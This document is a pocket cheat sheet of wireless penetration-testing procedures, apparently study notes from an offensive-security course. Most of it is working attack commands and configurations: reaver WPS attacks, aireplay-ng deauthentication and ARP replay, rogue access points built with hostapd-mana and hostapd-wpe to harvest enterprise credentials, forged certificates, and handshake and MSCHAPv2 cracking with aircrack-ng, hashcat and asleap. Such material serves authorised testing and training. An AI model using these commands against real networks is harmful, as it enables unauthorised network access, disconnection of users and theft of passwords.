# Offensive Security Wireless Pen-Testing Cheat Sheet [Pocket Version]

## Procedures by Protocol

-----------------

## A. Open Network

* Connect with OPN WPA Supplicant Configuration

--------

## B. WPS Based Network

* Scan for WPS Networks

* use wash 
  
  * `wash -i wlan0mon`

* WPS Attack
  
  * `reaver -b 34:08:04:09:3D:38 -i wlan0mon -c 11 -v`
  
  * `sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K`

* Reconnect using wpa_supplicant

----------------------------------

## C. WEP Based Network

* Packet capture to save credentials
  
  * airodump

* Spoof Mac Address as needed 
  
  * Macchanger

* Fake auth 
  
  * aireplay-ng ``aireplay-ng -1``

* If Fake auth worked gather new IVs [as many IVs as possible]
  
  * ARP Replay attack ``aireplay-ng -3``

* Password Crack
  
  * aircrack-ng

* Reconnect
  
  * wpa_suplicant 

-----------------------------------

## D. WPA2/3-PSK

* Packet capture to save credentials
  
  - airodump

* Fake auth
  
  - `aireplay-ng -1`

* Send Deauth packets to access point and/or client and access point
  
  * `aireplay-ng -0`

* Capture Handshake in already running dump

* Decrypt handshake once captured
  
  * Aircrack

* Reconnect
  
  - wpa_suplicant

-----------------------------------------------

## E. WPA3-SAE [Downgrade Attack]

* Hostapd-mana
  
  * Create config to use `mana.conf`

* EAP user config
  
  * `hostapd.eap_usr`
  
  * This file is referenced in `mana.conf`

* OpenSSL cert generation
  
  - 

* Spawn Rouge AP
  
  * ``hostapd-mana mana.conf``

* Send Deauth packets to access point and/or client and access point
  
  - `aireplay-ng -0`

* Decrypt handshake once captured
  
  * ``hashcat -a 0 -m 2500``

* - Reconnect
    
    - wpa_suplicant
  
  ---

## F. WPA3-MGT [Enterprise Attack]

* Packet capture to save authentication packets
  
  - airodump

* Send Deauth packets to access point and/or client and access point
  
  - `aireplay-ng -0`

* Gather domain information from packets
  
  * Tshark / WireShark
    
    * User name
    
    * Domain name
    
    * OU information
    
    * CA information
    
    * Location

* Create certs for mimic attack
  
  * Openssl
    
    * client certs
    
    * server certs

* Create EAP user config
  
  * mana.eap_user

* Hostapd config
  
  * hostapd config

* Packet capture to save authentication packets
  
  - airodump

* Start Rouge AP
  
  * ``hostapd-mana hostapd.conf``

* Send Deauth packets to access point and/or client and access point
  
  - `aireplay-ng -0`

* View Victim attempts to authenticate to your Rouge AP. 
  
  * Hash is captured while hostapd.conf is running 

* Crack the password
  
  * `asleap -C`
  
  * `hashcat -a 0 -m 5500`

* Reconnect
  
  - wpa_suplicant

----------------------------

# Wifi Tools:

### 1. Hardware management

* Show USB devices
  
  * `sudo lsusb -vv`

* Show active links
  
  * `iplink show`

* Interface management tool 
  
  * `ifconfig`

* Change interface channel
  
  * `iwconfig wlan0mon channel 11`

```bash
#Configure interface for first time use 
ip link set wlan0 down
iw dev wlan0 set type monitor
#or 
iwconfig wlan0 mode [monitor],[managed] 
ip link set wlan0 up
```

### 2. Airmon-ng

* - Kill troublesome processes
    
    - `airmon-ng check kill`
  
  - Start monitoring generally
    
    - `airmon-ng start wlan0`
  
  - Start on a specified channel
    
    - `sudo airmon-ng start wlan0 11`

### 3. Airodump-ng

* ```bash
  # Target specific BSSID and channel
  airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
  
  #Examples
  # Scanning/Dumping  WPS networks
  airodump-ng wlan0 --manufacturer --wps --band abg -c 11
  
  #Traditional Dumping
  airodump-ng wlan0 -c 6 --bssid 6E:89:D4:EC:34:37 -w 
  ./wireless_cap/testing_my_knowledge 
  ```

### 4. Aireplay-ng

* Ensure you can inject `sudo aireplay-ng -9 wlan0mon`
  
  1. Sometimes we will need to disable Access Point Detection
     
     `sudo aireplay-ng -9 -D wlan0mon`

* ```bash
  # Fake auth [this is to make sure that you can talk with the AP prior to 
  # your attack]
  aireplay-ng -1 0 -a <BSSID> -h <Your_MAC> wlan0mon
  aireplay-ng -1 3600 -q 10 -a F0:9F:C2:AA:19:29 wlan0mon
  # 6000 - Reauthenticate every 6000 seconds. The long period also causes keep alive packets to be sent.
  # -o 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.
  # -q 10 - Send keep alive packets every 10 seconds.
  aireplay-ng -1 6000 -o 1 -q 10 -e Lab210 -a F0:9F:C2:AA:19:29 -h BA:49:A9:53:A1:8C wlan0mon
  
  #Deauth
  aireplay-ng -0 10 -a <BSSID> wlan0mon
  aireplay-ng -0 1 -a <BSSID> -c <Client_MAC> wlan0
  
  # ARP replay attack
  aireplay-ng -3 -b <BSSID> -h <Your_MAC> wlan0mon
  aireplay-ng --arpreplay -b <BSSID> -h <Client_MAC> wlan0
  ```

### 5. Aircrack-ng

* ```bash
  #Example of cracking for WEP
  aircrack-ng -z -b <BSSID> capture.cap
  aircrack-ng -z -n 128 -f 3 -l result.txt -b <MAC_Address> capture.cap
  
  #Example of cracking for WPA/WPA2
  # Aircrack with wordlist and John
  aircrack-ng -w <wordlist.txt> -b <BSSID> handshake.cap
  
  aircrack-ng -w /usr/share/john/password.lst -e wifu
  -b 34:08:04:09:3D:38 wpa-01.cap
  ```

### 6. WPA-Supplicant

* Example `wpa_supplicant.conf` file
  
  * ```bash
    #OPN Network
    network={
        ssid="ssid_name"
        key_mgmt=NONE
        scan_ssid=1
    }
    ----------------------
    #WEP Network
    # WEP password should be in lowercase or uppercase hex, remove any double quotes and colons
    network={
      ssid="wifi-old"
      key_mgmt=NONE
      wep_key0=hex_password
      wep_tx_keyidx=0
    }
    
    ------------------------
    #WPA/WPA2/WPA3-PSK Network
    # Available proto version: WPA, WPA2, WPA3
    network={
        ssid="wifi-mobile"
        psk="password"
        scan_ssid=1
        key_mgmt=WPA-PSK
        proto=WPA2
    }
    
    -----------------------------
    #WPA3-SAE
    network={
            ssid="wifi-regional"
            key_mgmt=SAE
            sae_password="chocolate1"
            proto=RSN
            pairwise=CCMP
            group=CCMP
            scan_ssid=1
            ieee80211w=1
    }
    ----------------------------
    #WPA-MGT (WPA Enterprise) [User/Pass Connection Type]
    network={
        ssid="wifi-corp"
        bssid=F0:9F:C2:71:22:15
        key_mgmt=WPA-EAP
        eap=PEAP
        identity="domain\user"
        password="password"
        phase1="peaplabel=0"
        phase2="auth=MSCHAPV2"
    }
    ------------------------------
    #WPA-MGT (WPA Enterprise) [client certificate Connection Type]
    network={
            ssid="wifi-global"
            scan_ssid=1
            mode=0
            proto=RSN
            key_mgmt=WPA-EAP
            auth_alg=OPEN
            eap=TLS
            identity="GLOBAL\GlobalAdmin"
            ca_cert="./ca.crt"
            client_cert="./client.crt"
            private_key="./client.key"
            private_key_passwd="whatever"
    }
    
    ----------------------
    #WPA-MGT #WPA-MGT (WPA Enterprise) [MD5 Connection type]
    network={
        ssid="<Your_SSID>"
        key_mgmt=IEEE8021X
        eap=MD5
        identity="<Your_Username>"
        password="<Your_Password>"
    }
    ```

* Connecting  
  
  * ```bash
    #Run supplicant in the back ground
    wpa_supplicant -i wlan0 -c wpa_supplicant.conf -B
    #Run supplicant with drivers specified 
    wpa_supplicant -Dnl80211 -i wlan2 -c free.conf
    
    #Once associated, you’ll need to request an IP:
    sudo dhclient wlan0 -v 
    #or
    sudo dhcpcd wlan0
    #Or for `systemd` users:
    sudo systemd-networkd
    ```

## 7. Hostapd-mana

* ```bash
  #### HOSTAPD.CONF######
  # Interface configuration
  interface=wlan1
  ssid=ENTER_SSID_HERE
  channel=1
  auth_algs=3
  wpa_key_mgmt=WPA-EAP
  wpa_pairwise=TKIP CCMP
  wpa=3
  hw_mode=g
  ieee8021x=1
  driver=nl80211
  
  # EAP Configuration
  eap_server=1
  eap_user_file=hostapd.eap_user
  
  # Mana Configuration
  enable_mana=1
  mana_loud=1
  mana_credout=credentials.creds
  mana_eapsuccess=1
  mana_wpe=1
  # EAP TLS MitM
  mana_eaptls=1
  
  # Certificate Configuration
  ca_cert=ca.pem
  server_cert=server.pem
  private_key=server-key.pem
  dh_file=dh.pem
  ```

* ```bash
  ####hostapd.eap_user#####
  * TTLS,PEAP,TLS,MD5,GTC,FAST
  "t" TTLS-PAP,GTC,TTLS-CHAP,TTLS-MSCHAP,TTLS-MSCHAPV2,MD5 "challenge1234" [2]
  ```

## 8. OpenSSL

* ```bash
  # generate our Diffie-Hellman parameters
  openssl dhparam -out dh.pem 2048
  
  #generate our Certificate Authority (CA) key
  openssl genrsa -out ca-key.pem 2048
  
  # generate  x509 cert 
  openssl req -new -x509 -nodes -days 100 -key ca-key.pem -out ca.pem
  
  #server cert and private key as referenced in teh hostapd.conf file
  openssl req -newkey rsa:2048 -nodes -days 100 -keyout server-key.pem -out server-key.pem
  
  #prompt will be for a challenge password.  Match what you have in the config above
  
  #server x509 cert
  openssl x509 -req -days 100 -set_serial 01 -in server-key.pem -out server.pem -CA ca.pem -CAkey ca-key.pem
  ```

## 9. Hostapd-wpe

```bash
#location of config file
/etc/hostapd-wpe/hostapd-wpe.conf

#things to change 
interface=wlan1
ssid=HTB-Corp
channel=1
```

```bash
#normal execution
hostapd-wpe hostapd-wpe.conf 
#exmple to start hostapd-wpe with attack options
hostapd-wpe -c -k /etc/hostapd-wpe/hostapd-wpe.conf
```

```bash
#example output 
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: HTB\Sentinal.Jr
MANA EAP EAP-MSCHAPV2 ASLEAP user=Sentinal.Jr | asleap -C b5:13:4f:4e:e1:93:f4:98 -R 32:28:b5:61:21:4b:35:fe:55:bc:61:eb:bd:b2:a1:4b:3f:79:4d:87:e6:88:e3:ff
```

  --------

# Tools:

#### A. John the Ripper:

```bash
#John password file location
/usr/share/john/password.lst

#The JtR mangling rules are located
 /etc/john/john.conf

#Chaning JtR rules can be as simple as 
sudo nano /etc/john/john.conf
# Add two numbers to the end of each password
$[0-9]$[0-9]
$[0-9]$[0-9]$[0-9]

#have your new custom wordlist output for use with aircrack-ng
john --wordlist=/usr/share/john/password.lst --rules --stdout 
| aircrack-ng -e wifu -w - ~/wpa-01.cap
```

---

#### B. Crunch

```bash
crunch _min_ _max_ options 
    @ represents lowercase characters or characters from a defined set
    , represents uppercase characters
    % represent numbers
    ^ represents symbols

#How to fill in for possible missing characters. 
crunch 11 11 -t password%%%
# or 
crunch 11 11 0123456789 -t password@@@

# The -p option generates unique words from a character set or a set of 
# whole words. 
crunch 1 1 -p dog cat bird
# this creates all of the different variations of bird, dog, and cat together
# as a single password

#you can combine generation and words by doing the following
crunch 5 5 -t ddd%% -p dog cat bird
crunch 5 5 aADE -t ddd@@ -p dog cat bird

#Now we can pipe the data from crunch into aircrack-ng
crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap 
-w -
```

#### C.  Hashcat

```bash
# Crack with hashcat
hashcat -m 2500 handshake.hccapx wordlist.txt
hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
hashcat -m 2500 --deprecated-check-disable output.hccapx
 /usr/share/john/password.lst

# hashcat mode 22000
hashcat -a 0 -m  {22000 or 2500}  hash.hc22000 /usr/share/john/password.lst

hcxpcapngtool -o hash.hc22000 Lab210-01.cap
hashcat -a 0 -m 22000 hash.hc22000 /usr/shar/wordlist/rockyou.txt

# Convert .cap to .hccapx for hashcat
cap2hccapx handshake.cap handshake.hccapx

# Capture PMKID
hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
hcxpcapngtool -o pmkid.16800 -E essidlist.txt dump.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid.16800 wordlist.txt

# Format for hashcat -m 5500 (MSCHAPv2)
<username>::<domain>:<challenge>:<response>:unused

# Run with hashcat
hashcat -m 5500 hash.txt wordlist.txt
hashcat -m 5500 hash.txt wordlist.txt --show
```

## D. T-Shark

* Extract Email address from x509 Packet
  
  * `tshark -r *.cap -Y "wlan.bssid == F0:9F:C2:71:22:16 && x509sat.IA5String" -T fields -e x509sat.IA5String`

* Extract potential user names from pcap
  
  * `tshark -r *.cap -Y '(eap && wlan.ra == BSSID_MAC:ADDRESS) && (eap.identity)' -T fields -e eap.identity`

* Pulling cert from Network PCAP
  
  * `tshark -r *.pcap -Y '(eap.code == 2) && (wlan.sa == BSSID_MAC:ADDRESS) && (tls.handshake.certificate)' `
  
  * `tshark -r *.pcap -Y 'tls.handshake.certificate' -T fields -e tls.handshake.certificate`
  
  * `tshark -r *.cap -Y '(ssl.handshake.certificate && eapol)' -T fields -e tls.handshake.certificate -e wlan.sa -e wlan.ra`

* convert contents to PEM/DER
  
  * output cert contents and copy to clip board
  
  * `vi cert.txt 
    xxd -r -ps cert.txt | openssl x509 -inform der -text`

## E. asleap

* `asleap -C -R -W wordlist.txt`

* ``asleap -C f6:54:a4:8a:79:60:c7:d6 -R 16:37:40:99:cd:cc:17:0c:25:fc:b2:7d:e2:aa:7a:42:e3:ad:ae:a6:e7:d3:01:07 -W /usr/share/wordlists/rockyou.txt``
  
  ------------------------------

# Miscellaneous

#### 1. wget

* `wget -r -l2 https://www.abc123.com`

## 2. curl

* `curl http://192.168.1.1/example.txt`

## 3. macchanger

* ```bash
  #view mac address currently 
  macchanger --show wlan0
  #process to change mac address
  systemctl stop network-manager
  ip link set wlan2 down
  macchanger -m b0:72:bf:44:b0:49 wlan2
  ip link set wlan2 up
  ```

## 4. remote desktop

* ``rdesktop 192.168.0.1 -u username -p password -f -x 0x80``
